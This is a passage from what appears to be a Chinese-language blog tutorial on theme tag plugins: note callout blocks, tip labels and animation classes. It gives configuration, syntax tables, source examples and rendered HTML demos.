data-href="#分栏-4">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-5">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border<span class="emphasis">_radius: 3</span></span><br><span class="line"><span class="emphasis">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line"><span class="emphasis">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line"><span class="emphasis">  light_</span>bg<span class="emphasis">_offset: 0</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 自带icon</span></span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"><span class="section"># 外部icon</span></span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.自带icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / primary / success / info / warning / danger ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】不显示 icon</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><p>2.外部icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / blue / pink / red / purple / orange / green ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】可配置自定义 icon (只支持 fontawesome 图标, 也可以配置 no-icon )</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note simple %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note modern %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note disabled %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-5"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note simple"><p>默认 提示块标签</p></div><div class="note default simple"><p>default 提示块标签</p></div><div class="note primary simple"><p>primary 提示块标签</p></div><div class="note success simple"><p>success 提示块标签</p></div><div class="note info simple"><p>info 提示块标签</p></div><div class="note warning simple"><p>warning 提示块标签</p></div><div class="note danger simple"><p>danger 提示块标签</p></div>2.`modern`样式<div class="note modern"><p>默认 提示块标签</p></div><div class="note default modern"><p>default 提示块标签</p></div><div class="note primary modern"><p>primary 提示块标签</p></div><div class="note success modern"><p>success 提示块标签</p></div><div class="note info modern"><p>info 提示块标签</p></div><div class="note warning modern"><p>warning 提示块标签</p></div><div class="note danger modern"><p>danger 提示块标签</p></div><p>3.<code>flat</code>样式</p><div class="note flat"><p>默认 提示块标签</p></div><div class="note default flat"><p>default 提示块标签</p></div><div class="note primary flat"><p>primary 提示块标签</p></div><div class="note success flat"><p>success 提示块标签</p></div><div class="note info flat"><p>info 提示块标签</p></div><div class="note warning flat"><p>warning 提示块标签</p></div><div class="note danger flat"><p>danger 提示块标签</p></div><p>4.<code>disabled</code>样式</p><div class="note disabled"><p>默认 提示块标签</p></div><div class="note default disabled"><p>default 提示块标签</p></div><div class="note primary disabled"><p>primary 提示块标签</p></div><div class="note success disabled"><p>success 提示块标签</p></div><div class="note info disabled"><p>info 提示块标签</p></div><div class="note warning disabled"><p>warning 提示块标签</p></div><div class="note danger disabled"><p>danger 提示块标签</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>默认 提示块标签</p></div><div class="note default no-icon flat"><p>default 提示块标签</p></div><div class="note primary no-icon flat"><p>primary 提示块标签</p></div><div class="note success no-icon flat"><p>success 提示块标签</p></div><div class="note info no-icon flat"><p>info 提示块标签</p></div><div class="note warning no-icon flat"><p>warning 提示块标签</p></div><div class="note danger no-icon flat"><p>danger 提示块标签</p></div>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note icon-padding simple"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding simple"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding simple"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding simple"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>2.<code>modern</code>样式</p><div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>3.<code>flat</code>样式</p><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>4.<code>disabled</code>样式</p><div class="note icon-padding disabled"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding disabled"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding disabled"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding disabled"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding disabled"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue no-icon flat"><p>2021年快到了…</p></div><div class="note pink no-icon flat"><p>小心开车 安全至上</p></div><div class="note red no-icon flat"><p>这是三片呢？还是四片？</p></div><div class="note orange no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple no-icon flat"><p>剪刀石头布</p></div><div class="note green no-icon flat"><p>前端最讨厌的浏览器</p></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-5-上标标签-tip">2.5 上标标签 tip</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li><code>自定义图标</code>: 支持fontawesome。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip %&#125;default&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip info %&#125;info&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;自定义font awesome图标&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="tip "><p>default</p></div><div class="tip info"><p>info</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>自定义font awesome图标</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-6-动态标签-anima">2.6 动态标签 anima</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><div class="note info flat"><ol><li>将所需的CSS类添加到图标（或DOM中的任何元素）。</li><li>对于父级悬停样式，需要给目标元素添加指定CSS类，同时还要给目标元素的父级元素添加CSS类<code>faa-parent animated-hover</code>。（详情见示例及示例源码）<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>可以通过给目标元素添加CSS类<code>faa-fast</code>或<code>faa-slow</code>来控制动画快慢。</li></ol></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.On DOM load（当页面加载时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>2.调整动画速度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>3.On hover（当鼠标悬停时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>4.On parent hover（当鼠标悬停在父级元素时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.On DOM load（当页面加载时显示动画）</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div>2.调整动画速度<div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div>3.On hover（当鼠标悬停时显示动画）<div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div>4.On parent hover（当鼠标悬停在父级元素时显示动画）<div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">warning</p></div><div class="tip ban 